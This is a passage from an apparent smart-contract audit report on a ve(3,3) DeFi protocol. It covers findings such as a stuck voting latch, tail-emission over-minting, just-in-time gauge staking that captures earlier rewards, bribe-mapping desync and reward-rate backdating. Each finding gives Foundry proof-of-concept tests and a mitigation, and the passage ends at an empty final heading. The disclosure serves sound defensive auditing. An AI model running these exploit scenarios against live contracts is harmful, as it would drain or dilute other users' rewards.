        gaugeFees.token0 = 1;
        TransferHelper.safeTransfer(token0, msg.sender, toTransfer0);
    }
    if (toTransfer1 > 0) {
        gaugeFees.token1 = 1;
        TransferHelper.safeTransfer(token1, msg.sender, toTransfer1);
    }

    amount0 = toTransfer0;
    amount1 = toTransfer1;
    emit CollectFees(msg.sender, amount0, amount1);
}

This keeps the gas-saving sentinel while guaranteeing the function’s return values and event match actual transfers. Alternatively, remove the sentinel entirely and use a separate boolean marker, if acceptable for gas/storage trade-offs.





 **Derived From** : (usedWeights[tokenId] > 0) => VotingEscrow(_ve).voted(tokenId) == true after vote; after reset(tokenId): VotingEscrow(_ve).voted(tokenId) == false

## [M-34]. Zero-weight vote leaves veNFT ‘voted’ latch stuck true, blocking withdraw/transfer until next epoch

## Derived From Pattern/Invariant
(usedWeights[tokenId] > 0) => VotingEscrow(_ve).voted(tokenId) == true after vote; after reset(tokenId): VotingEscrow(_ve).voted(tokenId) == false

## Exploit Type
AccountingInvariantViolation

## Location
VoterV3.vote/_vote/reset

## Minimim Privilege Required
Permissionless

## Description
In VoterV3._vote(), the ‘voted’ latch in VotingEscrow is set only if _usedWeight > 0:

if (_usedWeight > 0) IVotingEscrow(_ve).voting(_tokenId);

However, when a user calls vote() with an empty pool list or with only dead gauges so that _usedWeight == 0, _vote() first calls _reset() (which clears storage weights and usedWeights to 0) but does NOT call IVotingEscrow(_ve).abstain(_tokenId). As a result, if the veNFT previously had voted == true, it remains stuck true even though usedWeights[tokenId] == 0. Since VotingEscrow.withdraw()/transfer/merge require !voted[_tokenId], the user is blocked from withdrawing an expired lock or transferring/merging their NFT for the remainder of the current epoch. They also cannot call reset() to clear the latch immediately because reset() is gated by onlyNewEpoch (reverts with "VOTED" until next epoch). This is a state-machine violation: the voted latch does not reflect the absence of votes when _usedWeight == 0.

## Impact
A veNFT that performs vote() with empty arrays (or only dead gauges so that usedWeight==0) will have its storage weights cleared but its VotingEscrow.voted latch remain true. This prevents withdraw/transfer/merge for the rest of the current epoch (until next epoch), effectively time-locking matured funds and freezing NFT mobility for up to one full epoch.

## Proof of Concept
Revised scenario:
1) User previously voted in a prior epoch (voted[tokenId] == true).
2) In a new epoch and within the voting window, user calls VoterV3.vote(tokenId, [], []).
   - _vote() first calls _reset(), which clears storage weights and usedWeights to 0, but does NOT call IVotingEscrow.abstain().
   - Because _usedWeight == 0, _vote() skips calling IVotingEscrow.voting() and returns.
   - vote() then sets lastVoted to epochStart(now)+1.
3) Now usedWeights[tokenId] == 0, but VotingEscrow.voted[tokenId] remains true.
4) User cannot call reset() to clear the latch until next epoch due to onlyNewEpoch (reverts with VOTED), and cannot withdraw/transfer/merge the veNFT because VotingEscrow checks require !voted[_tokenId], reverting with ATT. Funds/NFT are stuck for the remainder of the epoch.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {VoterV3} from "contracts/VoterV3.sol";
import {VotingEscrow} from "contracts/VotingEscrow.sol";
import {HybraTimeLibrary} from "contracts/libraries/HybraTimeLibrary.sol";

contract MockToken {
    function transfer(address, uint) external pure returns (bool) { return true; }
    function transferFrom(address, address, uint) external pure returns (bool) { return true; }
    function approve(address, uint) external pure returns (bool) { return true; }
}

contract ZeroWeightVoteLatchTest is Test {
    VotingEscrow ve;
    VoterV3 voter;
    MockToken token;

    address user = address(0xA11CE);
    uint256 tokenId;

    function setUp() public {
        token = new MockToken();
        ve = new VotingEscrow(address(token), address(0xBEEF));

        voter = new VoterV3();
        // tokenHandler/gaugeManager/permissionRegistry are unused in this test path
        voter.initialize(address(ve), address(0), address(0), address(0));

        // Set voter in ve (allowed since this test contract is the team by constructor)
        ve.setVoter(address(voter));

        // Create a lock for 2 epochs
        vm.warp(100);
        vm.startPrank(user);
        token.approve(address(ve), type(uint256).max);
        tokenId = ve.create_lock(1e18, 2 * HybraTimeLibrary.WEEK);
        vm.stopPrank();

        // Simulate that the NFT previously had voted == true
        vm.prank(address(voter));
        ve.voting(tokenId);

        // Move to the next epoch's voting window: epoch 1 starts at 1800; voting window starts at 2100
        vm.warp(2101);
    }

    function test_zeroWeightVoteLeavesVotedTrueAndBlocksWithdraw() public {
        // Sanity: user owns the NFT and voted latch is true
        assertEq(ve.ownerOf(tokenId), user);
        assertTrue(ve.voted(tokenId));

        // User votes with empty arrays → _reset() clears weights but abstain() is NOT called, usedWeight == 0
        vm.prank(user);
        voter.vote(tokenId, new address[](0), new uint256[](0));

        // Immediate reset in the same epoch is blocked by onlyNewEpoch (VOTED)
        vm.prank(user);
        vm.expectRevert(bytes("VOTED"));
        voter.reset(tokenId);

        // Latch remains true even though usedWeights[tokenId] == 0
        assertTrue(ve.voted(tokenId));
        assertEq(voter.usedWeights(tokenId), 0);

        // After lock expiry (end rounded to 3600), withdraw is blocked due to voted latch (ATT)
        vm.warp(3601);
        vm.prank(user);
        vm.expectRevert(bytes("ATT"));
        ve.withdraw(tokenId);
    }
}


## Suggested Mitigation
Ensure the VotingEscrow.voted latch always matches usedWeights after any vote path. Two safe options:
- Option A (minimal change): In VoterV3._vote(), after computing _usedWeight, call
  if (_usedWeight > 0) { IVotingEscrow(_ve).voting(_tokenId); } else { IVotingEscrow(_ve).abstain(_tokenId); }
  This guarantees the latch reflects zero-weight outcomes (including empty arrays or all-dead gauges).
- Option B (centralize in reset): Call IVotingEscrow(_ve).abstain(_tokenId) inside _reset() unconditionally (then remove the extra abstain in the external reset() to avoid double calls). Since _vote() starts by calling _reset(), any subsequent positive weight will re-set the latch via voting() as it already does.





 **Derived From** : Tail emission uses totalSupply instead of circulating supply, causing over‑minting

## [M-35]. Over-minting in MinterUpgradeable.weekly_emission due to tail floor using totalSupply rather than circulating supply

## Derived From Pattern/Invariant
Tail emission uses totalSupply instead of circulating supply, causing over‑minting

## Exploit Type
AccountingInvariantViolation

## Location
MinterUpgradeable.weekly_emission

## Minimim Privilege Required
Permissionless

## Description
The ve(3,3) tail emission floor is computed from totalSupply instead of circulating supply. When calculate_emission() decays below the tail, weekly_emission() mints totalSupply * TAIL_EMISSION instead of (totalSupply − veBalance − deadBalance) * TAIL_EMISSION. This breaks the emission invariant and inflates HYBR. Relevant code:

function circulating_emission() public view returns (uint) {
    return (_hybr.totalSupply() * TAIL_EMISSION) / MAX_BPS; // should use circulating_supply()
}

function weekly_emission() public view returns (uint) {
    return Math.max(calculate_emission(), circulating_emission());
}

function circulating_supply() public view returns (uint) {
    return _hybr.totalSupply() - _hybr.balanceOf(address(_ve)) - _hybr.balanceOf(address(burnTokenAddress));
}

Impact example: If 80% of supply is ve-locked, tail floor should be 0.2 * totalSupply * tailRate. The current code mints ~1.0 * totalSupply * tailRate (5x too high), causing hidden inflation. Because rebase = min(lockedShare, REBASEMAX) * weekly, over-minted weekly directly increases ve rebases; a large locker can capture most of the excess.

## Impact
When the emission decay falls below the tail floor, weekly_emission() selects a tail based on totalSupply instead of circulating supply. If a large fraction of HYBR is locked in VotingEscrow (or burned), the contract mints materially more HYBR than intended each epoch. This inflates gauge rewards and ve rebases; a large ve holder can capture a disproportionate share of the excess by voting and LP-ing. The issue is permissionless once the high lock ratio exists and leads to long-term supply distortion and value dilution.

## Proof of Concept
Scenario demonstrating over-minting:
1) State: totalSupply = 2,000,000,000e18. An attacker (or whale) locks 80% of the supply into VotingEscrow, so circulating ≈ 400,000,000e18.
2) First epoch after initialization mints the fixed bootstrap amount weekly = 2,600,000e18.
3) In the second epoch, calculate_emission() = 2,600,000e18 * 0.99 = 2,574,000e18. The buggy tail floor is computed as totalSupply * 0.25% ≈ 5,000,000e18, while the correct tail should be circulating * 0.25% = 1,000,000e18.
4) Because weekly_emission() picks max(decay, tail), the contract selects ≈5,000,000e18 (bug) instead of 2,574,000e18. This over-mints ~2.426M HYBR for that epoch.
5) The rebase amount is min(lockedShare, REBASEMAX) of weekly. With 80% locked and REBASEMAX=30%, rebase becomes 30% of 5,000,000e18 = 1,500,000e18 (vs 772,200e18 if computed off 2,574,000e18). A large ve holder can claim most of this excess and also direct the inflated gauge emissions to pools they LP in.
6) Anyone can trigger update_period once per epoch, so exploitation is permissionless once the high lock ratio exists.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {MinterUpgradeable} from "../contracts/MinterUpgradeable.sol";

interface IHybra {
    function totalSupply() external view returns (uint);
    function balanceOf(address) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function mint(address to, uint value) external returns (bool);
    function minter() external view returns (address);
    function burn(uint) external returns (bool);
    function burnFrom(address, uint) external returns (bool);
}

contract MockHYBR is IHybra {
    string public constant name = "HYBR";
    string public constant symbol = "HYBR";
    uint8 public constant decimals = 18;
    uint internal _ts;
    mapping(address => uint) internal _bal;
    mapping(address => mapping(address => uint)) internal _allow;

    function totalSupply() external view override returns (uint) { return _ts; }
    function balanceOf(address a) external view override returns (uint) { return _bal[a]; }
    function approve(address s, uint v) external override returns (bool){ _allow[msg.sender][s]=v; return true; }
    function transfer(address to, uint v) external override returns (bool){ require(_bal[msg.sender] >= v, "bal"); _bal[msg.sender] -= v; _bal[to] += v; return true; }
    function transferFrom(address from, address to, uint v) external override returns (bool){ require(_allow[from][msg.sender] >= v, "allow"); require(_bal[from] >= v, "bal"); _allow[from][msg.sender] -= v; _bal[from] -= v; _bal[to] += v; return true; }
    function mint(address to, uint v) external override returns (bool){ _ts += v; _bal[to] += v; return true; }
    function minter() external pure override returns (address) { return address(0); }
    function burn(uint) external pure override returns (bool) { return true; }
    function burnFrom(address, uint) external pure override returns (bool) { return true; }
}

contract MockVE {
    address public immutable _token;
    constructor(address t){ _token = t; }
    function token() external view returns(address){ return _token; }
}

contract MockRD { function checkpoint_token() external {} }
contract MockGM { function notifyRewardAmount(uint256) external {} }

contract MinterTailEmissionBugTest is Test {
    MinterUpgradeable minter;
    MockHYBR hy;
    MockVE ve;
    MockRD rd;
    MockGM gm;

    address attacker = address(0xA11CE);

    function setUp() public {
        hy = new MockHYBR();
        ve = new MockVE(address(hy));
        rd = new MockRD();
        gm = new MockGM();

        minter = new MinterUpgradeable();
        minter.initialize(address(gm), address(ve), address(rd));
        // Finish bootstrap initializer (no claimant distribution)
        minter._initialize(new address[](0), new uint[](0), 0);

        // Mint large supply and simulate heavy locking by sending HYBR to ve
        uint twoB = 2_000_000_000 ether;
        hy.mint(attacker, twoB);
        vm.prank(attacker);
        hy.transfer(address(ve), (twoB * 80) / 100); // ~80% held by ve contract

        // First epoch: bootstrap weekly = 2.6M
        vm.warp(minter.active_period() + 1800 + 1); // HybraTimeLibrary.WEEK == 1800 on test profile
        minter.update_period();

        // Move to second epoch where weekly = max(decay, tail)
        vm.warp(block.timestamp + 1800 + 1);
    }

    function test_OverMinting_UsesTotalSupplyForTail() public {
        // Sanity: ~80% held at ve address
        uint total = hy.totalSupply();
        uint veBal = hy.balanceOf(address(ve));
        assertGt((veBal * 100) / total, 70);

        // Precompute values BEFORE calling second update_period()
        uint decay = minter.calculate_emission(); // expected ~2,574,000e18
        uint tail_bug = (total * 25) / 10_000;    // 25 bps of totalSupply
        uint circulating = total - veBal - hy.balanceOf(0x000000000000000000000000000000000000dEaD);
        uint tail_correct = (circulating * 25) / 10_000; // should be used instead

        uint beforeSupply = hy.totalSupply();
        minter.update_period();
        uint afterSupply = hy.totalSupply();

        uint weeklyChosen = minter.weekly();

        // Assertions: bug picks tail based on totalSupply, exceeding decay
        assertGt(weeklyChosen, decay);
        assertEq(weeklyChosen, tail_bug);
        assertLt(tail_correct, decay);

        // Minted this epoch equals buggy weekly amount (over-mint vs intended)
        uint minted = afterSupply - beforeSupply;
        assertEq(minted, weeklyChosen);
        assertGt(minted, decay);
    }
}


## Suggested Mitigation
Compute the tail floor from circulating supply rather than totalSupply. Replace circulating_emission() with:

function circulating_emission() public view returns (uint) {
    return (circulating_supply() * TAIL_EMISSION) / MAX_BPS;
}

Optionally, cache circulating_supply() at the start of update_period() and use that cached value for all per-epoch calculations to ensure a single, consistent pre-mint snapshot.





 **Derived From** : nonfungiblePositionManager.ownerOf(tokenId) == address(this) && lastUpdateTime[tokenId] == block.timestamp && this.earned(tokenId) == 0

## [H-36]. JIT stake in GaugeCL.deposit captures pre-update emissions due to lazy global update and pre-update snapshot

## Derived From Pattern/Invariant
nonfungiblePositionManager.ownerOf(tokenId) == address(this) && lastUpdateTime[tokenId] == block.timestamp && this.earned(tokenId) == 0

## Exploit Type
EventConsistency

## Location
GaugeCL.deposit

## Minimim Privilege Required
Permissionless

## Description
GaugeCL.deposit stakes liquidity before any reward growth update and snapshots rewardGrowthInside using the pool’s stale global growth (by passing 0). Later, when clPool.updateRewardsGrowthGlobal() is first called (e.g., during notifyRewardAmount or user withdraw), the minted reward for the entire time since clPool.lastUpdated gets distributed using the current stakedLiquidity, which already includes the newly deposited NFT. Because the depositor’s baseline was taken before that global update, the depositor can withdraw in the next block and claim a share of emissions that accrued before their deposit. This violates the referential invariant “no rewards should be immediately claimable” post-deposit (conceptually immediate: next tx/block) and dilutes existing stakers.

Vulnerable snippet (GaugeCL.deposit):

    // no global update before staking
    nonfungiblePositionManager.safeTransferFrom(msg.sender, address(this), tokenId);
    clPool.stake(int128(liquidity), tickLower, tickUpper, true);

    // baseline taken from stale global growth
    uint256 rewardGrowth = clPool.getRewardGrowthInside(tickLower, tickUpper, 0);
    rewardGrowthInside[tokenId] = rewardGrowth;
    lastUpdateTime[tokenId] = block.timestamp;

Root cause: lazy global update + ordering. Growth is not updated before adding the new stake; the baseline uses pre-update global growth, enabling the new staker to capture prior-period emissions when the next update happens.

## Impact
A new staker can front-run the next global reward update, have their liquidity included in the pool’s stakedLiquidity before rewards are minted for the elapsed period, and snapshot their baseline against the stale global growth. When the first update is triggered (notifyRewardAmount or any user action), the prior-period emissions are distributed using the inflated stakedLiquidity that includes the attacker, allowing them to claim a proportional share of emissions accrued before their deposit. This directly dilutes existing stakers and results in real monetary loss.

## Proof of Concept
1) Assume clPool.lastUpdated << now and prior emissions accrued but global growth not updated (lazy update).
2) Attacker deposits a position NFT into GaugeCL (GaugeCL.deposit). The contract stakes first, then snapshots baseline against stale global growth.
3) Distributor calls notifyRewardAmount in the same block (or anyone later triggers an update). clPool.updateRewardsGrowthGlobal() now mints all prior-period rewards using the current (inflated) stakedLiquidity that includes attacker’s deposit.
4) In the next block, attacker calls withdraw(tokenId, redeemType). _getReward() updates rewards and computes the delta against the pre-update baseline, allowing attacker to claim a share of pre-deposit emissions.

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {GaugeCL} from "contracts/CLGauge/GaugeCL.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {FixedPoint128} from "contracts/CLGauge/libraries/FixedPoint128.sol";

contract TestERC20 is IERC20 {
    string public name = "R"; string public symbol = "R"; uint8 public decimals = 18;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    uint256 public override totalSupply;
    function transfer(address to, uint256 a) external override returns (bool){balanceOf[msg.sender]-=a; balanceOf[to]+=a; return true;}
    function approve(address s, uint256 a) external override returns (bool){allowance[msg.sender][s]=a; return true;}
    function transferFrom(address f, address t, uint256 a) external override returns (bool){uint256 al=allowance[f][msg.sender]; if(al!=type(uint256).max) allowance[f][msg.sender]=al-a; balanceOf[f]-=a; balanceOf[t]+=a; return true;}
    function mint(address to, uint256 a) external {balanceOf[to]+=a; totalSupply+=a;}
}

// Minimal rHYBR mock used by GaugeCL to "redeemFor"
contract MockRHYBR {
    mapping(address => uint256) public mintedFor;
    function depostionEmissionsToken(uint256) external {}
    function redeemFor(uint256 a, uint8, address r) external { mintedFor[r] += a; }
}

// Minimal CL pool mock with the subset GaugeCL uses
contract MockCLPool {
    uint256 public lastUpdated; 
    uint256 public rewardReserve; 
    uint256 public staked; 
    uint256 public growth;
    uint256 public rate; 
    address public t0; 
    address public t1;
    constructor(address _t0, address _t1, uint256 _lu){ t0=_t0; t1=_t1; lastUpdated=_lu; }
    function token0() external view returns(address){return t0;}
    function token1() external view returns(address){return t1;}
    function collectFees() external {}
    function gaugeFees() external view returns (uint256,uint256){return (0,0);}    
    function rollover() external view returns (uint256){ return 0; }
    function updateRewardsGrowthGlobal() external {
        if (block.timestamp > lastUpdated && rewardReserve > 0 && staked > 0) {
            uint256 dt = block.timestamp - lastUpdated;
            uint256 rew = rate * dt;
            if (rew > rewardReserve) rew = rewardReserve;
            rewardReserve -= rew;
            growth += (rew * FixedPoint128.Q128) / staked;
            lastUpdated = block.timestamp;
        }
    }
    function getRewardGrowthInside(int24,int24,uint256 overrideGlobal) external view returns (uint256){
        return overrideGlobal == 0 ? growth : overrideGlobal;
    }
    function stakedLiquidity() external view returns (uint256){ return staked; }
    function rewardGrowthGlobalX128() external view returns (uint256){ return growth; }
    function rewardReserve_() external view returns (uint256){ return rewardReserve; }
    function rewardReserve() external view returns (uint256){ return rewardReserve; }
    function lastUpdated_() external view returns (uint256){ return lastUpdated; }
    function stake(int128 liq, int24, int24, bool) external { if (liq >= 0) staked += uint128(liq); else staked -= uint128(-liq); }
    function syncReward(uint256 _rate, uint256 _reserve, uint256) external { rate = _rate; rewardReserve = _reserve; }
}

// Minimal factory so GaugeCL can verify pool address
contract MockFactory {
    address public pool;
    constructor(address p){ pool = p; }
    function getPool(address, address, int24) external view returns (address){ return pool; }
}

// Minimal NonfungiblePositionManager mock
contract MockNFPM {
    struct P{address token0; address token1; int24 spacing; int24 lower; int24 upper; uint128 liq;}
    mapping(uint256=>P) public pos; 
    mapping(uint256=>address) public ownerOf; 
    address public fac;
    constructor(address _f){ fac=_f; }
    function factory() external view returns (address){ return fac; }
    function setPos(uint256 id, address t0, address t1, int24 sp, int24 lo, int24 up, uint128 liq, address o) external {
        pos[id]=P(t0,t1,sp,lo,up,liq); ownerOf[id]=o;
    }
    function positions(uint256 id) external view returns (
        uint96,address,address,address,int24,int24,int24,uint128,uint256,uint256,uint128,uint128
    ){
        P memory p = pos[id];
        return (0,address(0),p.token0,p.token1,p.spacing,p.lower,p.upper,p.liq,0,0,0,0);
    }
    function collect(bytes calldata) external returns (uint256,uint256){ return (0,0); }
    function safeTransferFrom(address from, address to, uint256 id) external {
        require(ownerOf[id]==from, "NO"); ownerOf[id]=to; IERC721Receiver(to).onERC721Received(msg.sender, from, id, "");
    }
}

contract GaugeCL_JIT_Stake_Test is Test {
    TestERC20 reward; MockRHYBR r; MockCLPool pool; MockFactory fac; MockNFPM nfpm; GaugeCL gauge;
    address attacker = address(0xA11CE); address dist = address(0xD1ST);
    address token0 = address(0xAAA1); address token1 = address(0xAAA2);

    function setUp() public {
        vm.warp(1000);
        reward = new TestERC20(); r = new MockRHYBR();
        pool = new MockCLPool(token0, token1, 900); // rewards accrued since 900
        fac = new MockFactory(address(pool));
        nfpm = new MockNFPM(address(fac));
        // attacker owns an LP-NFT with liquidity=100
        nfpm.setPos(1, token0, token1, int24(60), int24(-60), int24(60), uint128(100), attacker);
        // pre-existing staker so old LPs should own all pre-1000 emissions
        pool.stake(int128(uint128(1000)), 0, 0, true);
        // deploy gauge
        gauge = new GaugeCL(address(reward), address(r), address(0), address(pool), dist, address(0), address(0), true, address(nfpm), address(fac));
        // fund distributor for notify
        reward.mint(dist, 1e24);
        vm.prank(dist); reward.approve(address(gauge), type(uint256).max);
        // initial sync (no funds yet)
        vm.prank(dist); gauge.notifyRewardAmount(address(reward), 0);
        // set prior-period accrual directly on pool
        pool.syncReward(1e16, 1e21, block.timestamp + 10_000);
    }

    function test_JIT_Stake_Captures_PreUpdate_Emissions() public {
        // attacker deposits before next global update
        vm.startPrank(attacker);
        gauge.deposit(1);
        vm.stopPrank();

        // distributor triggers update in the same block (mints past emissions using CURRENT staked, incl attacker)
        vm.prank(dist); gauge.notifyRewardAmount(address(reward), 1e20);

        // next block, attacker withdraws and harvests
        vm.warp(block.timestamp + 1);
        vm.prank(attacker); gauge.withdraw(1, 0);

        uint256 harvested = r.mintedFor(attacker);
        assertGt(harvested, 0, "attacker siphoned pre-update emissions");
    }
}


## Suggested Mitigation
Update rewards before admitting new stake, and snapshot against the up-to-date global growth. In GaugeCL.deposit, do: 1) clPool.updateRewardsGrowthGlobal(); 2) nonfungiblePositionManager.safeTransferFrom(...); 3) clPool.stake(...); 4) rewardGrowthInside[tokenId] = clPool.getRewardGrowthInside(tickLower, tickUpper, 0); 5) lastUpdateTime[tokenId] = block.timestamp. Alternatively, compute the synthetic up-to-now rewardGrowthGlobalX128 (as in _earned) and pass it to getRewardGrowthInside to take the baseline after accounting for all prior accruals, but before the next period starts. Either approach ensures no pre-deposit accrual leaks to the new staker.





 **Derived From** : internal_bribes[_gauge]_post == _internal AND _internal.code.length > 0

## [L-37]. setInternalBribeFor breaks cross-contract sync: GaugeManager mapping diverges from Gauge’s internal_bribe, causing bribe/fees routing DoS

## Derived From Pattern/Invariant
internal_bribes[_gauge]_post == _internal AND _internal.code.length > 0

## Exploit Type
EventConsistency

## Location
GaugeManager.setInternalBribeFor

## Minimim Privilege Required
RequiresRole

## Description
GaugeManager.setInternalBribeFor only updates its own internal_bribes mapping and enforces _internal.code.length > 0. It does not update the Gauge contract’s internal_bribe field (owned by GaugeFactory/Gauge) nor any Voter mappings. This violates the referential invariant that bribe addresses across Manager↔Gauge↔Voter remain in sync. After rotation, Gauge.claimFees() (and CLGauge equivalents) still notify the old internal_bribe while off-chain components/UI reading GaugeManager think the new address is effective. If the factory later syncs the Gauge but Voter mappings remain stale, fees flow to new bribe while deposits/weights remain on the old bribe, making rewards unclaimable. Vulnerable snippet:

function setInternalBribeFor(address _gauge, address _internal) external GaugeAdmin {
    require(isGauge[_gauge], "!GAUGE");
    _setInternalBribe(_gauge, _internal); // only updates GaugeManager mapping, not the Gauge nor Voter
}

In practice, reasonable use by GAUGE_ADMIN to rotate bribes can lead to a persistent DoS of bribe claims due to state divergence.

## Impact
Admin-only misconfiguration. setInternalBribeFor updates only GaugeManager’s mapping and does not change the actual Gauge’s internal_bribe nor the Voter’s gauge→bribe mappings. This can desynchronize on-chain sources of truth and mislead off-chain consumers (e.g., front-ends calling GaugeManager.fetchInternalBribeFromPool), causing users to claim against an empty bribe. Fees continue to be routed by the Gauge to the old bribe, so assets are not lost. A true rewards DoS would require additional privileged actions (e.g., separately rotating the Gauge’s bribe via the factory without updating Voter), which remains an admin workflow issue rather than an attacker vector.

## Proof of Concept
- Deploy GaugeManager and a mock Gauge with internal_bribe set to oldBribe.
- Mark the mock Gauge as valid via an admin helper (or factory in real flow).
- Call GaugeManager.setInternalBribeFor(gauge, newBribe) as GAUGE_ADMIN.
- Observe: GaugeManager.internal_bribes[gauge] = newBribe, but gauge.internal_bribe remains oldBribe.
- Fees claimed by the Gauge go to oldBribe; front-ends using GaugeManager think newBribe is correct → claim attempts fail.
- If the factory subsequently updates the Gauge to newBribe without updating any Voter mappings, vote deposits remain on oldBribe while rewards accrue on newBribe, leading to unclaimable rewards.

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {GaugeManager} from "ve33/contracts/GaugeManager.sol";
import {IPermissionsRegistry} from "ve33/contracts/interfaces/IPermissionsRegistry.sol";

contract Dummy { }

contract VotingEscrowMock {
    address public _token;
    constructor(address t){ _token = t; }
    function token() external view returns(address){ return _token; }
}

contract PRMock is IPermissionsRegistry {
    function emergencyCouncil() external pure returns(address){ return address(0); }
    function hybraTeamMultisig() external pure returns(address){ return address(0); }
    function hasRole(bytes memory, address) external pure returns(bool){ return true; }
}

contract MockGauge {
    address public internal_bribe;
    constructor(address ib) { internal_bribe = ib; }
    function setInternalBribe(address ib) external { internal_bribe = ib; }
}

contract GaugeManagerHarness is GaugeManager {
    function forceSetIsGauge(address g, bool v) external { isGauge[g] = v; }
}

contract SetInternalBribeInvariantTest is Test {
    GaugeManagerHarness mgr;
    MockGauge gauge;
    Dummy oldBribe;
    Dummy newBribe;

    function setUp() public {
        VotingEscrowMock ve = new VotingEscrowMock(address(new Dummy()));
        PRMock reg = new PRMock();
        mgr = new GaugeManagerHarness();
        // initialize(ve, tokenHandler, gaugeFactory, gaugeFactoryCL, pairFactory, pairFactoryCL, permissionReg, nfpm)
        mgr.initialize(address(ve), address(new Dummy()), address(new Dummy()), address(new Dummy()), address(new Dummy()), address(new Dummy()), address(reg), address(new Dummy()));

        oldBribe = new Dummy();
        newBribe = new Dummy();
        gauge = new MockGauge(address(oldBribe));

        // mark gauge as valid so setInternalBribeFor passes !GAUGE check
        mgr.forceSetIsGauge(address(gauge), true);
    }

    function test_SetInternalBribeFor_LeavesGaugeOutOfSync() public {
        // pre: Gauge uses oldBribe, manager has no mapping yet
        assertEq(gauge.internal_bribe(), address(oldBribe));
        assertEq(mgr.internal_bribes(address(gauge)), address(0));

        // act: GAUGE_ADMIN rotates bribe in manager only
        vm.prank(address(0xA11CE));
        mgr.setInternalBribeFor(address(gauge), address(newBribe));

        // assert: manager mapping updated, gauge still points to oldBribe (divergence)
        assertEq(mgr.internal_bribes(address(gauge)), address(newBribe));
        assertEq(gauge.internal_bribe(), address(oldBribe));
    }
}


## Suggested Mitigation
Pick one consistent strategy and enforce it: 1) Source-of-truth only on Gauges: remove or deprecate GaugeManager.internal_bribes/external_bribes and always query the Gauge (and/or Voter) for current bribe addresses in helpers like fetchInternalBribeFromPool/fetchExternalBribeFromPool. Expose read getters in IGauge/IGaugeCL if needed. 2) If rotations via GaugeManager are desired, make them atomic: in setInternalBribeFor/setExternalBribeFor, call the appropriate GaugeFactory(GaugeFactoryCL).setInternalBribe/… to update the Gauge and also update the Voter’s gaugeToFees/gaugeToBribes mappings in the same transaction (with proper interfaces and access control). Emit a single event after all three are updated. Additionally, consider removing or restricting the current mapping setters to avoid partial updates that only change GaugeManager’s local mapping.





 **Derived From** : Let dt = _blockTimestamp() - pre.lastUpdated (mod 2^32). Then: post.lastUpdated >= pre.lastUpdated; If dt == 0 or pre.rewardReserve == 0: no state change. Else let r = min(pre.rewardRate * dt, pre.rewardReserve). Then post.rewardReserve = pre.rewardReserve - r AND (if pre.stakedLiquidity > 0 then post.rewardGrowthGlobalX128 = pre.rewardGrowthGlobalX128 + floor(r * 2^128 / pre.stakedLiquidity) and post.rollover = pre.rollover; else post.rollover = pre.rollover + r and post.rewardGrowthGlobalX128 = pre.rewardGrowthGlobalX128).

## [M-38]. Epoch boundary backdating: syncReward rewinds time and misprices accrued rewards at the new rate

## Derived From Pattern/Invariant
Let dt = _blockTimestamp() - pre.lastUpdated (mod 2^32). Then: post.lastUpdated >= pre.lastUpdated; If dt == 0 or pre.rewardReserve == 0: no state change. Else let r = min(pre.rewardRate * dt, pre.rewardReserve). Then post.rewardReserve = pre.rewardReserve - r AND (if pre.stakedLiquidity > 0 then post.rewardGrowthGlobalX128 = pre.rewardGrowthGlobalX128 + floor(r * 2^128 / pre.stakedLiquidity) and post.rollover = pre.rollover; else post.rollover = pre.rollover + r and post.rewardGrowthGlobalX128 = pre.rewardGrowthGlobalX128).

## Exploit Type
TimestampDependentLogic

## Location
CLPool.syncReward

## Minimim Privilege Required
RequiresRole

## Description
CLPool.syncReward sets a new (rewardRate, rewardReserve, periodFinish) but does NOT checkpoint time via _updateRewardsGrowthGlobal(). Consequently, the next update uses dt since the previous lastUpdated and multiplies it by the newly-set rewardRate, not the old rate that actually applied during most of dt. This violates temporal monotonicity across epoch boundaries: time that elapsed under rate r1 is retroactively accounted at r2. If r2 < r1, stakers lose matured yield; if r2 > r1, they unjustly gain. Additionally, syncReward deletes rollover, so any pending reward pushed to rollover just before sync (e.g., via a user-triggered tick-cross) is zeroed and lost. Vulnerable snippet:

function syncReward(uint256 _rewardRate, uint256 _rewardReserve, uint256 _periodFinish) external lock onlyGauge {
    rewardRate = _rewardRate;            // replaces rate without settling prior accrual
    rewardReserve = _rewardReserve;
    periodFinish = _periodFinish;
    delete rollover;                     // resets rollover without settle
}

No call to _updateRewardsGrowthGlobal() is made before changing parameters, so dt prior to sync is mis-accounted under the new rate.

## Impact
By not checkpointing accrued rewards before replacing (rewardRate, rewardReserve, periodFinish), the next settlement applies the new rewardRate to the entire elapsed time since lastUpdated. A privileged gauge can, during normal epoch updates, underpay or overpay already-matured rewards by front-running settlement with a lower or higher rate. Settlement can be triggered by any swap that crosses a tick (pool-internal call to _updateRewardsGrowthGlobal) or by the gauge calling updateRewardsGrowthGlobal. This leads to order-dependent, non-deterministic accounting and material loss (or unintended gain) of matured yield for stakers. Rollover deletion does discard rewards accrued when stakedLiquidity==0, but that does not involve tick crosses; whether that is intended is a product decision.

## Proof of Concept
Scenario (undercount on epoch boundary):
- Precondition: Some stakedLiquidity > 0; lastUpdated is at time T0.
- Epoch E uses rewardRate r1 and has a large rewardReserve.
- Time elapses dt seconds with no settlement (no tick-crossing swap and no gauge settlement), so lastUpdated remains T0.
- Just before a settlement would occur, the gauge calls syncReward(r2, newReserve, newFinish) with r2 << r1. syncReward does not checkpoint accrued rewards.
- A subsequent settlement occurs (either a swap crosses a tick, which calls _updateRewardsGrowthGlobal internally, or the gauge calls updateRewardsGrowthGlobal). The function computes reward = min(r2 * (now - lastUpdated), rewardReserve), applying r2 to the entire dt that actually belonged to r1.
- Stakers are underpaid by approximately (r1 - r2) * dt. If r2 >> r1, they are overpaid by (r2 - r1) * dt.
Notes:
- Settlement may be triggered by anyone via a tick-crossing swap; only updateRewardsGrowthGlobal() is restricted to the gauge.
- rollover only accumulates when stakedLiquidity == 0; deleting it on syncReward discards those accruals, but tick-crosses do not push rewards into rollover.

## Proof of Code
